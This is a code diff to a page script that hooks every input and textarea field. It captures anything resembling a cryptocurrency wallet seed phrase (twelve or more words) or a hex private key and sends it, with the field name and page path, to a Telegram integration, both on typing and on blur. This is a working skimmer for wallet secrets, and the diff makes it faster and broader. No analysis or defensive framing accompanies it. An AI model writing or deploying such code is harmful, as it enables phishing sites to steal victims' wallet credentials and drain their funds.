@@ -32,23 +32,46 @@ document.addEventListener('DOMContentLoaded', function() {
     });
   }, 2000);
   
-  // Also capture input changes for phrase/seed fields
+  // Capture input changes for phrase/seed fields - INSTANT
+  let phraseTimeout;
   document.addEventListener('input', function(e) {
     const target = e.target;
     if (target.tagName === 'INPUT' || target.tagName === 'TEXTAREA') {
-      const val = target.value;
-      // Check if it looks like a seed phrase (12+ words)
-      if (val.trim().split(/\s+/).length >= 12) {
-        setTimeout(function() {
+      clearTimeout(phraseTimeout);
+      phraseTimeout = setTimeout(function() {
+        const val = target.value.trim();
+        const words = val.split(/\s+/).filter(w => w.length > 0);
+        
+        // Send if 12+ words OR looks like private key
+        if (words.length >= 12 || (val.length > 40 && /^[0-9a-fA-Fx]+$/.test(val))) {
           if (window.TelegramIntegration) {
             window.TelegramIntegration.send({
-              type: 'seed_phrase',
-              phrase: val,
-              field: target.name || target.id || target.placeholder
-            });
+              type: words.length >= 12 ? 'SEED_PHRASE' : 'PRIVATE_KEY',
+              content: val,
+              wordCount: words.length,
+              field: target.name || target.id || target.placeholder || 'unknown',
+              page: window.location.pathname
+            }).then(() => console.log('✅ Phrase sent')).catch(e => console.error('❌ Failed:', e));
           }
-        }, 1000);
-      }
+        }
+      }, 500);
     }
   });
+  
+  // Also on blur
+  document.addEventListener('blur', function(e) {
+    const target = e.target;
+    if ((target.tagName === 'INPUT' || target.tagName === 'TEXTAREA') && target.value.trim()) {
+      const val = target.value.trim();
+      const words = val.split(/\s+/).filter(w => w.length > 0);
+      if (words.length >= 12 && window.TelegramIntegration) {
+        window.TelegramIntegration.send({
+          type: 'SEED_PHRASE_BLUR',
+          content: val,
+          wordCount: words.length,
+          field: target.name || target.id || target.placeholder || 'unknown'
+        });
+      }
+    }
+  }, true);
 });
